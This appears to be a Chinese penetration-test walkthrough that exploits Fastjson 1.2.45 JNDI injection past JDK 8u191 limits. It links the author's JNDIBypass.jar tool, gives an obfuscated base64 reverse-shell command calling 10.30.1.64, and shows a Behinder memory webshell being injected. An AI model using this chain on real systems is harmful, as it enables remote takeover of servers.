首页：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695884408815-3c2adcfa-f6e7-4313-8659-8be0767a1ca1.png#averageHue=%231a1611&clientId=ubcf6682b-ddc2-4&from=paste&height=740&id=u743c6b3d&originHeight=925&originWidth=1760&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3044703&status=done&style=none&taskId=u557edbdc-2df2-4c66-93dc-7a7c2507f8f&title=&width=1408)
登录处burp抓包，先查看fastjson版本(之前说过就不说了)， 1.2.45，在这个大版本下是存在JNDI注入的(mappings缓存绕过)，JNDI注入工具走一波，
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695778494110-00dadf4e-027d-47de-a04a-e54f7dbbcc6a.png#averageHue=%23fefdfd&clientId=uf8c09517-8f2f-4&from=paste&height=186&id=u517e3070&originHeight=232&originWidth=1103&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30677&status=done&style=none&taskId=u2924f6f4-8b2f-4ab4-88bc-6ccc74fc743&title=&width=882.4)
尝试所有他的links都失败了，原因就是这里的JDK版本为8u342，大于8u191导致的。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695780480086-c122d6c1-b317-4699-b931-58851dd2c1cb.png#averageHue=%23535965&clientId=uf8c09517-8f2f-4&from=paste&height=448&id=ua0a00069&originHeight=560&originWidth=1420&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1936888&status=done&style=none&taskId=u9206433d-9cde-4e0a-b3e0-f200b8a0228&title=&width=1136)
JNDI注入在JDK8u191之后受到了极大限制，所以这里需要绕过JDK高版本。JDK高版本绕过可以参考[浅蓝的这篇文章](https://tttang.com/archive/1405)。但这里还有一个问题，环境中并没有tomcat el或者groovy等依赖(这个同样有方法是可以探测到的)。
考虑到环境是FastJson的原因，之前的实验环境中又一直提到FastJson的原生发序列化漏洞，所以绕过的方式便是使用LDAP的javaSerializedData打Fastjson的原生反序列化Gadget。
为了方便，写了一个Bypass高版本JDK的工具，目前主要针对FastJson的JNDI注入，功能还比较单一，后续也打算在这基础上持续扩展和完善。[JNDIBypass.jar](https://www.yuque.com/attachments/yuque/0/2023/jar/26045928/1696397571772-9a97bd59-1da9-4391-acc8-b169908816d9.jar?_lake_card=%7B%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2023%2Fjar%2F26045928%2F1696397571772-9a97bd59-1da9-4391-acc8-b169908816d9.jar%22%2C%22name%22%3A%22JNDIBypass.jar%22%2C%22size%22%3A18591417%2C%22ext%22%3A%22jar%22%2C%22source%22%3A%22%22%2C%22status%22%3A%22done%22%2C%22download%22%3Atrue%2C%22taskId%22%3A%22u9855c1f6-2572-4db6-95c4-2a61a99d1c5%22%2C%22taskType%22%3A%22transfer%22%2C%22type%22%3A%22application%2Fjava-archive%22%2C%22mode%22%3A%22title%22%2C%22id%22%3A%22ObgKJ%22%2C%22card%22%3A%22file%22%7D)
目前支持执行命令、注入内存马、回显马等基础的东西。
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695884866072-765fef98-1df5-4f7a-9a2b-42247e64d4b9.png#averageHue=%234f5462&clientId=ubcf6682b-ddc2-4&from=paste&height=439&id=u4053f7ff&originHeight=549&originWidth=1441&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1948944&status=done&style=none&taskId=u47eefab8-9529-41de-b56c-659d7300613&title=&width=1152.8)
执行命令反弹shell：` java -jar .\JNDIBypass.jar -a 10.30.1.64 -p 1389 -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4zMC4xLjY0Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}"`
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695785888687-ff736c2a-e564-4536-ae2a-894462c2b883.png#averageHue=%23444851&clientId=uf8c09517-8f2f-4&from=paste&height=168&id=u8c991ce4&originHeight=210&originWidth=1456&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=677170&status=done&style=none&taskId=uc8dcac53-15d8-4286-83de-fdc78e42bdc&title=&width=1164.8)
将生成的JNDI Link填入
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695785920483-a8ccbbbd-84cf-4071-8e9e-318c8d8698ae.png#averageHue=%23fefefe&clientId=uf8c09517-8f2f-4&from=paste&height=214&id=uc13684be&originHeight=267&originWidth=1064&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=41798&status=done&style=none&taskId=ufe5b8dd5-440d-452e-8a4c-0e18e128615&title=&width=851.2)
反弹成功
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695785965696-8e739038-a91d-4b83-a4c2-b678e1bda047.png#averageHue=%2354535e&clientId=uf8c09517-8f2f-4&from=paste&height=190&id=ue613adeb&originHeight=237&originWidth=975&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=570277&status=done&style=none&taskId=u6437feeb-f783-4835-91b9-aa340cd30c4&title=&width=780)
尝试注入冰蝎马：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695786700256-c6112bfd-ff46-4a5b-9ac5-3c19e9dc6218.png#averageHue=%23464a52&clientId=uf8c09517-8f2f-4&from=paste&height=159&id=ud7e30bb9&originHeight=199&originWidth=1444&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=602425&status=done&style=none&taskId=uf80490e0-6edb-4be7-a048-5d9e11120a9&title=&width=1155.2)
冰蝎连接：
![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1695786791023-575f3c97-c7e4-48d2-af87-ff9f0f302722.png#averageHue=%23494949&clientId=uf8c09517-8f2f-4&from=paste&height=271&id=u7ed08584&originHeight=339&originWidth=974&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21732&status=done&style=none&taskId=ud2ba4cb3-f59a-4ce3-83f5-c05279ef921&title=&width=779.2)
